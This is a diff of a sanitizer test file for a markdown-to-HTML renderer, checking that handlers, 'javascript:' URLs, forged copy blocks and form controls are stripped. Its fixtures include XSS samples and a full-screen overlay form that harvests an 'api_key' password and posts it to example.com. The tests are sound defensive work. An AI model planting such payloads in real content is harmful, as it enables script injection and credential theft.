@@ -17,7 +17,8 @@ vi.mock('./basePath', () => ({
 }));
 
 import { lucidos } from '@lucidos/sdk';
-import { renderMarkdown, renderMarkdownInline } from './renderMarkdown';
+import { renderMarkdown, renderMarkdownInline, sanitizeHtmlFragments } from './renderMarkdown';
+import { COPY_ID_NONCE, TASK_CHECKBOX_ATTR, taskCheckboxTag } from './markedConfig';
 // The downstream consumer of this output, so one test can assert the pair.
 import { linkifyPaths } from './linkifyPaths';
 
@@ -381,8 +382,8 @@ describe('renderMarkdown', () => {
     // A bare boolean attribute serializes with an empty value, which is the
     // same attribute: HTML gives it its meaning by presence, not by value.
     it('keeps a bare boolean attribute and the attribute after it', () => {
-      expect(renderMarkdown('<input disabled onfocus="x" value="v">', { cache: false }))
-        .toContain('<input disabled="" value="v">');
+      expect(renderMarkdown('<details open onfocus="x" title="v">d</details>', { cache: false }))
+        .toContain('<details open="" title="v">');
     });
 
     // An apostrophe in a comment, or in an unquoted attribute value, used to
@@ -446,10 +447,10 @@ describe('renderMarkdown', () => {
       expect(html).not.toMatch(/onerror/i);
     });
 
-    // A textarea's content is TEXT, so markup typed into one is shown, not run.
-    it('shows markup inside a raw-text element as the text it is', () => {
+    it('shows a textarea as text, and still scrubs the markup inside it', () => {
       const html = renderMarkdown('<textarea><b onclick="x">hi</b></textarea>', { cache: false });
-      expect(html).toContain('<textarea>&lt;b onclick="x"&gt;hi&lt;/b&gt;</textarea>');
+      expect(html).toContain('&lt;textarea&gt;');
+      expect(html).not.toMatch(/<textarea/i);
       expect(html).not.toMatch(/<b[^>]*onclick/i);
     });
 
@@ -500,12 +501,16 @@ describe('renderMarkdown', () => {
 
     // The SVG spelling of href navigates identically, and a form submits to its
     // action, so all three take a `javascript:` URL the same way `href` does.
+    // A form control shows as text, so only a live attribute counts.
     it.each([
       '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
       '<form action="javascript:alert(1)"><button>go</button></form>',
       '<button formaction="javascript:alert(1)">go</button>',
     ])('strips a dangerous URL from every spelling of a navigating attribute: %s', (src) => {
-      expect(renderMarkdown(src, { cache: false })).not.toMatch(/javascript:/i);
+      const body = new DOMParser().parseFromString(renderMarkdown(src, { cache: false }), 'text/html').body;
+      const values = Array.from(body.querySelectorAll('*'))
+        .flatMap((el) => Array.from(el.attributes, (attr) => attr.value));
+      expect(values.join(' ')).not.toMatch(/javascript:/i);
     });
 
     // The copy control puts its payload on the clipboard, so content that can
@@ -608,6 +613,18 @@ describe('renderMarkdown', () => {
       const copied = Array.from(doc.querySelectorAll('[data-copy-code]'))
         .map((el) => el.querySelector('pre code')?.textContent);
       expect(copied).toEqual(['npm i bar']);
+    });
+
+    it('a forged copy block gets no Copy button, and a real one does', () => {
+      const html = renderMarkdown(
+        '<span class="copyable-block" data-copy-id="0"><code>x</code></span>\n\n<copy>real</copy>',
+        { cache: false },
+      );
+      const doc = new DOMParser().parseFromString(html, 'text/html');
+      const withButton = Array.from(doc.querySelectorAll('.copyable-block'))
+        .filter((block) => block.querySelector('.copy-btn'))
+        .map((block) => block.getAttribute('data-copy-text'));
+      expect(withButton).toEqual(['real']);
     });
 
     it('keeps an ordinary action and xlink:href untouched', () => {
@@ -926,12 +943,12 @@ Use this pattern for all prompts.`;
     // The link renderer sees only markdown links. Raw HTML in an agent's
     // option preview put a live control inside the option <button>. A tap
     // meant to answer could then navigate the app away.
-    it('unwraps raw interactive HTML, keeping its text', () => {
+    it('unwraps a raw link and shows raw form controls as text', () => {
       const html = renderMarkdownInline(
         'a <a href="https://example.com">link</a>, a <button>button</button>, <input value="x"> end',
       );
-      expect(html).toContain('a link, a button,');
-      expect(html).toContain('end');
+      const text = new DOMParser().parseFromString(html, 'text/html').body.textContent;
+      expect(text).toBe('a link, a <button>button</button>, <input value="x"> end');
       expect(html).not.toMatch(/<(a|button|input)\b/);
     });
   });
@@ -1022,6 +1039,76 @@ Use this pattern for all prompts.`;
       expect(spy.mock.calls.length).toBe(before + 2); // re-parsed both times, not cached
       spy.mockRestore();
     });
+  });
+});
+
+/**
+ * Authored HTML can neither submit a form nor reach the top layer. Inline
+ * style stays, because containment, not filtering, bounds its layout.
+ */
+describe('authored form controls and the top layer', () => {
+  const ARTIFACT_PAYLOAD =
+    '<form action="https://example.com/collect" method="post" style="position:fixed;inset:0;z-index:2147483647;background:white"><input type="password" name="api_key"><button>Connect</button></form>';
+
+  const RENDERERS: [string, (src: string) => string][] = [
+    ['renderMarkdown', (src) => renderMarkdown(src, { cache: false })],
+    ['renderMarkdownInline', renderMarkdownInline],
+    ['sanitizeHtmlFragments', sanitizeHtmlFragments],
+  ];
+
+  const FORM_CONTROLS = `form, button, select, textarea, option, optgroup, datalist, input:not([${TASK_CHECKBOX_ATTR}="${COPY_ID_NONCE}"])`;
+
+  const parse = (html: string) => new DOMParser().parseFromString(html, 'text/html').body;
+
+  describe.each(RENDERERS)('%s', (_name, render) => {
+    it.each([
+      ['the artifact payload', ARTIFACT_PAYLOAD],
+      ['a forged task checkbox', `<input ${TASK_CHECKBOX_ATTR}="0000" type="text" name="k">`],
+      ['mixed case', '<FoRm action="https://example.com/c"><InPuT type=password><BUTTON>go</BUTTON></FoRm>'],
+      ['unclosed tags', '<form action="https://example.com/c"><input type=password><button>go'],
+      ['a select and a textarea', '<select><option>a</option><optgroup><option>b</option></optgroup></select><textarea>t</textarea>'],
+      ['a datalist', '<datalist id="d"><option value="a"></datalist>'],
+    ])('renders no form control for %s', (_label, src) => {
+      expect(parse(render(src)).querySelector(FORM_CONTROLS)).toBeNull();
+    });
+
+    it.each(['popover', 'popovertarget', 'popovertargetaction', 'command', 'commandfor'])(
+      'drops the %s attribute',
+      (attr) => {
+        const html = render(`<div ${attr}="x">a</div><span ${attr}>b</span>`);
+        expect(html).not.toMatch(new RegExp(`\\s${attr}=`, 'i'));
+      },
+    );
+  });
+
+  it('shows an authored button as the text the author wrote', () => {
+    const body = parse(renderMarkdown('Press <button>Connect</button> now', { cache: false }));
+    expect(body.textContent).toContain('<button>Connect</button>');
+  });
+
+  it('keeps the renderer task checkbox', () => {
+    const body = parse(renderMarkdown('- [ ] todo\n- [x] done', { cache: false }));
+    expect(body.querySelectorAll(`input[type="checkbox"][${TASK_CHECKBOX_ATTR}="${COPY_ID_NONCE}"]`)).toHaveLength(2);
+  });
+
+  it.each(RENDERERS)('%s rebuilds a checkbox that carries the real nonce', (_name, render) => {
+    const forged = `<input ${TASK_CHECKBOX_ATTR}="${COPY_ID_NONCE}" type="submit" form="f" formaction="https://example.com/c" checked>`;
+    const input = parse(render(forged)).querySelector('input');
+    const expected = parse(taskCheckboxTag(true)).querySelector('input');
+    expect(input?.getAttributeNames().sort()).toEqual(expected?.getAttributeNames().sort());
+    expect(input?.type).toBe('checkbox');
+    expect(input?.disabled).toBe(true);
+    expect(input?.checked).toBe(true);
+  });
+
+  it('keeps the Copy button on a fenced code block', () => {
+    const body = parse(renderMarkdown('```sh\nnpm i\n```', { cache: false }));
+    expect(body.querySelector('.code-block-header .copy-btn.code-block-copy-btn svg')).not.toBeNull();
+  });
+
+  it('keeps authored inline style for slides and diffs', () => {
+    expect(sanitizeHtmlFragments('<div style="color: red; padding: 1rem">x</div>'))
+      .toContain('style="color: red; padding: 1rem"');
   });
 });
 
@@ -1667,10 +1754,9 @@ describe('renderMarkdown unspaced em dashes', () => {
     expect(gaps(renderMarkdown(`word **${EM}** next`, { cache: false }))).toBe(0);
   });
 
-  it('leaves SVG and text-only elements alone, where a span would not survive', () => {
+  it('leaves SVG text alone, where a span would not survive', () => {
     const svg = `<svg width="10"><text x="1">A${EM}B</text></svg>`;
     expect(gaps(renderMarkdown(svg, { cache: false }))).toBe(0);
-    expect(gaps(renderMarkdown(`<textarea>a${EM}b</textarea>`, { cache: false }))).toBe(0);
   });
 
   it('never touches code', () => {
